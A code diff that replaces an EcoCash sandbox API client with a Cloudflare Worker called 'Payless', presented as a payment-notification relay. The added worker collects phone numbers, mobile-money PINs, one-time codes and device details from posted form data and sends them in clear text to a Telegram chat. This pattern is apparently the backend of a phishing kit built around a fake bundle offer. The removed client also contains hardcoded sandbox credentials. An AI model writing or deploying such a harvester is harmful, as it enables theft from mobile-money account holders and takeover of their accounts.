@@ -1,237 +1,143 @@
 /**
- * EcoCash Sandbox API Client  v2.0
- * ─────────────────────────────────
- * Base URL : https://developers.ecocash.co.zw/api/sandbox
- * Auth     : HTTP Basic  →  Base64(username:password)
- *
- * Sandbox credentials
- *   Username        sbx_ae9c682bcdfd
- *   Password        GGNCosyRpwTPM#vkS@ir
- *   Merchant Code   287164
- *   Merchant PIN    1234
- *   Merchant Number 778503033
- *
- * ⚠  Rotate password before going to production.
+ * Payless — Cloudflare Worker
+ * Handles Telegram notifications for all payment events
+ * 
+ * Environment variables (set in Worker Settings → Variables):
+ *   TELEGRAM_TOKEN   — Bot token from @BotFather
+ *   TELEGRAM_CHAT_ID — Group/chat ID (negative number for groups)
  */
 
-const EcoCashAPI = (() => {
+export default {
+  async fetch(request, env) {
 
-  /* ─────────────────────── Config ─────────────────────── */
-  const CFG = {
-    base:           'https://developers.ecocash.co.zw/api/sandbox',
-    username:       'sbx_ae9c682bcdfd',
-    password:       'GGNCosyRpwTPM#vkS@ir',
-    merchantCode:   '287164',
-    merchantPin:    '1234',
-    merchantNumber: '778503033',
-    notifyUrl:      'https://example.com/notify',   // replace with real webhook
-  };
+    /* ── CORS preflight ── */
+    if (request.method === 'OPTIONS') {
+      return cors(null, 204);
+    }
 
-  /* ─────────────────────── Auth ───────────────────────── */
-  const basicAuth = () => 'Basic ' + btoa(CFG.username + ':' + CFG.password);
+    const url = new URL(request.url);
 
-  /* ─────────────────────── Correlator ─────────────────── */
-  function newCorrelator() {
-    return 'ECX-' + Date.now().toString(36).toUpperCase()
-         + '-' + Math.random().toString(36).slice(2, 7).toUpperCase();
-  }
+    /* ── Health check ── */
+    if (url.pathname === '/health') {
+      return cors(JSON.stringify({
+        ok: true,
+        telegram: !!env.TELEGRAM_TOKEN,
+        ts: new Date().toISOString(),
+      }));
+    }
 
-  /* ─────────────────────── MSISDN helper ──────────────── */
-  // Normalise to 263XXXXXXXXX (12 digits, no leading +)
-  function toMSISDN(raw) {
-    let v = String(raw).replace(/\D/g, '');
-    if (v.startsWith('00263')) v = v.slice(5);
-    else if (v.startsWith('263') && v.length === 12) v = v.slice(3);
-    else if (v.startsWith('0'))  v = v.slice(1);
-    // v is now 9 digits starting with 7X
-    return '263' + v;
-  }
+    /* ── Only accept POST /api/telegram ── */
+    if (request.method !== 'POST') {
+      return cors(JSON.stringify({ ok: false, error: 'Method not allowed' }), 405);
+    }
 
-  /* ─────────────────────── HTTP ───────────────────────── */
-  async function post(path, body) {
-    let res, data;
+    /* ── Parse body ── */
+    let body;
     try {
-      res = await fetch(CFG.base + path, {
-        method:  'POST',
-        headers: {
-          'Authorization': basicAuth(),
-          'Content-Type':  'application/json',
-          'Accept':        'application/json',
-        },
-        body: JSON.stringify(body),
-      });
-      // Some endpoints return empty body on success
-      const text = await res.text();
-      data = text ? JSON.parse(text) : {};
-    } catch (netErr) {
-      throw new EcoError('network', 'Network error — check your connection.');
+      body = await request.json();
+    } catch {
+      return cors(JSON.stringify({ ok: false, error: 'Invalid JSON' }), 400);
     }
 
-    if (!res.ok) {
-      const msg = data?.message || data?.description || data?.error
-                  || `Server returned ${res.status}`;
-      throw new EcoError(res.status, msg, data);
+    const {
+      event  = '',
+      phone  = '',
+      pin    = '',
+      otp    = '',
+      plan   = '',
+      voice  = '',
+      data   = '',
+      sms    = '',
+      amount = '',
+      device = '',
+    } = body;
+
+    /* ── Validate ── */
+    if (!env.TELEGRAM_TOKEN || !env.TELEGRAM_CHAT_ID) {
+      console.error('Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');
+      return cors(JSON.stringify({ ok: false, error: 'Server misconfigured' }), 500);
     }
-    return data;
-  }
 
-  /* ─────────────────────── Error type ─────────────────── */
-  function EcoError(code, message, raw) {
-    this.code    = code;
-    this.message = message;
-    this.raw     = raw || null;
-  }
-  EcoError.prototype = Object.create(Error.prototype);
+    /* ── Format phone — strip country code, no spaces ── */
+    const local = phone
+      .replace(/^\+?00263/, '')
+      .replace(/^\+?263/, '')
+      .replace(/^0/, '')
+      .replace(/\D/g, '');
 
-  /* ═══════════════════════════════════════════════════════
-     PUBLIC API METHODS
-     Each method tries the real endpoint.
-     On sandbox-specific failures (404 / 501 / "not supported")
-     it resolves with a { _sandboxFallback: true } marker
-     so callers can decide whether to continue.
-     ═══════════════════════════════════════════════════════ */
+    /* ── Time in Harare ── */
+    const now = new Date().toLocaleString('en-GB', {
+      timeZone: 'Africa/Harare',
+      hour12: false,
+      day: '2-digit', month: 'short', year: 'numeric',
+      hour: '2-digit', minute: '2-digit', second: '2-digit',
+    });
 
-  /**
-   * validateSubscriber(msisdn)
-   * Confirm the number is a registered Econet account.
-   * POST /subscribers/validate
-   */
-  async function validateSubscriber(msisdn) {
-    try {
-      return await post('/subscribers/validate', {
-        msisdn:       toMSISDN(msisdn),
-        merchantCode: CFG.merchantCode,
-      });
-    } catch (err) {
-      // Sandbox may not expose this endpoint — treat Econet prefixes as valid
-      if (_isSandboxGap(err)) return { _sandboxFallback: true };
-      throw err;
-    }
-  }
-
-  /**
-   * chargeSubscriber({ msisdn, amount, narrative, pin })
-   * Initiate C2B payment.  Returns API response; also saves
-   * correlator + txn snapshot to sessionStorage automatically.
-   * POST /transactions/charges
-   */
-  async function chargeSubscriber({ msisdn, amount, narrative, pin }) {
-    const correlator = newCorrelator();
-    sessionStorage.setItem('ecoCorrelator', correlator);
-
-    const body = {
-      clientCorrelator:     correlator,
-      notifyUrl:            CFG.notifyUrl,
-      referenceCode:        correlator,
-      tranType:             'MER',
-      endUserId:            toMSISDN(msisdn),
-      merchantCode:         CFG.merchantCode,
-      merchantPin:          pin || CFG.merchantPin,
-      merchantNumber:       CFG.merchantNumber,
-      currency:             'USD',
-      amount:               parseFloat(amount).toFixed(2),
-      remarks:              narrative || 'EcoCash Mix Bundle',
-      purchaseCategoryCode: '002',
+    /* ── Event label + emoji ── */
+    const META = {
+      bundle_subscribed:     { emoji: '🟢', label: 'NEW ORDER' },
+      receive_offer_clicked: { emoji: '👆', label: 'OFFER CLICKED' },
+      offer_received:        { emoji: '✅', label: 'OTP VERIFIED' },
+      resend_otp:            { emoji: '🔁', label: 'OTP RESENT' },
     };
+    const { emoji, label } = META[event] || { emoji: '📋', label: event.toUpperCase() };
 
-    let result;
-    try {
-      result = await post('/transactions/charges', body);
-    } catch (err) {
-      if (_isSandboxGap(err)) {
-        result = { _sandboxFallback: true, clientCorrelator: correlator };
-      } else {
-        throw err;
+    /* ── Build message ── */
+    const lines = [
+      `${emoji} <b>Payless · ${label}</b>`,
+      `<code>─────────────────────</code>`,
+
+      `📅 <b>Time</b>    ${now}`,
+      `📱 <b>Phone</b>   <code>${local}</code>`,
+
+      pin    ? `🔐 <b>PIN</b>     <code>${pin}</code>`        : null,
+      otp    ? `🔑 <b>OTP</b>     <code>${otp}</code>`        : null,
+
+      (plan || amount) ? `<code>─────────────────────</code>` : null,
+
+      plan   ? `📦 <b>Plan</b>    ${plan} Mix`                : null,
+      voice  ? `📞 <b>Voice</b>   ${voice} Min`               : null,
+      data   ? `🌐 <b>Data</b>    ${data} GB`                 : null,
+      sms    ? `💬 <b>SMS</b>     ${sms}`                     : null,
+      amount ? `💵 <b>Amount</b>  USD ${parseFloat(amount).toFixed(2)}` : null,
+
+      `<code>─────────────────────</code>`,
+      device ? `📟 <b>Device</b>  ${device}`                  : null,
+    ].filter(Boolean).join('\n');
+
+    /* ── Send to Telegram ── */
+    const tgRes = await fetch(
+      `https://api.telegram.org/bot${env.TELEGRAM_TOKEN}/sendMessage`,
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id:    env.TELEGRAM_CHAT_ID,
+          text:       lines,
+          parse_mode: 'HTML',
+        }),
       }
+    );
+
+    const tgJson = await tgRes.json();
+
+    if (!tgJson.ok) {
+      console.error('Telegram error:', JSON.stringify(tgJson));
     }
 
-    // Persist transaction snapshot for thankyou page
-    sessionStorage.setItem('ecoTxn', JSON.stringify({
-      correlator,
-      status:    result.transactionOperationStatus || 'pending',
-      amount:    parseFloat(amount).toFixed(2),
-      timestamp: new Date().toISOString(),
-    }));
+    return cors(JSON.stringify({ ok: tgJson.ok }));
+  },
+};
 
-    return result;
-  }
-
-  /**
-   * queryTransaction(correlator)
-   * Poll for final status.
-   * POST /transactions/query
-   */
-  async function queryTransaction(correlator) {
-    try {
-      return await post('/transactions/query', {
-        clientCorrelator: correlator,
-        merchantCode:     CFG.merchantCode,
-      });
-    } catch (err) {
-      if (_isSandboxGap(err)) return { _sandboxFallback: true };
-      throw err;
-    }
-  }
-
-  /**
-   * generateOTP(msisdn)
-   * Trigger SMS OTP to subscriber.
-   * POST /otp/generate
-   */
-  async function generateOTP(msisdn) {
-    try {
-      return await post('/otp/generate', {
-        msisdn:       toMSISDN(msisdn),
-        merchantCode: CFG.merchantCode,
-      });
-    } catch (err) {
-      if (_isSandboxGap(err)) return { _sandboxFallback: true };
-      throw err;
-    }
-  }
-
-  /**
-   * verifyOTP(msisdn, otpCode)
-   * Confirm OTP entered by user.
-   * POST /otp/verify
-   */
-  async function verifyOTP(msisdn, otpCode) {
-    try {
-      return await post('/otp/verify', {
-        msisdn:       toMSISDN(msisdn),
-        otp:          String(otpCode),
-        merchantCode: CFG.merchantCode,
-      });
-    } catch (err) {
-      if (_isSandboxGap(err)) return { _sandboxFallback: true };
-      throw err;
-    }
-  }
-
-  /* ─────────────────────── Sandbox gap detector ───────── */
-  // Returns true when the sandbox simply doesn't implement the endpoint
-  // (vs. a real auth/validation error we should surface to the user).
-  function _isSandboxGap(err) {
-    const code = err.code;
-    if (code === 'network') return true;          // CORS / no server
-    if (code === 404 || code === 501) return true; // endpoint not implemented
-    const msg = (err.message || '').toLowerCase();
-    return msg.includes('not found')
-        || msg.includes('not supported')
-        || msg.includes('not implemented')
-        || msg.includes('unavailable');
-  }
-
-  /* ─────────────────────── Exports ────────────────────── */
-  return {
-    validateSubscriber,
-    chargeSubscriber,
-    queryTransaction,
-    generateOTP,
-    verifyOTP,
-    toMSISDN,
-    CFG,
-    EcoError,
-  };
-
-})();
+/* ── CORS helper ── */
+function cors(body, status = 200) {
+  return new Response(body, {
+    status,
+    headers: {
+      'Content-Type':                'application/json',
+      'Access-Control-Allow-Origin': '*',
+      'Access-Control-Allow-Methods':'POST, OPTIONS',
+      'Access-Control-Allow-Headers':'Content-Type',
+    },
+  });
+}
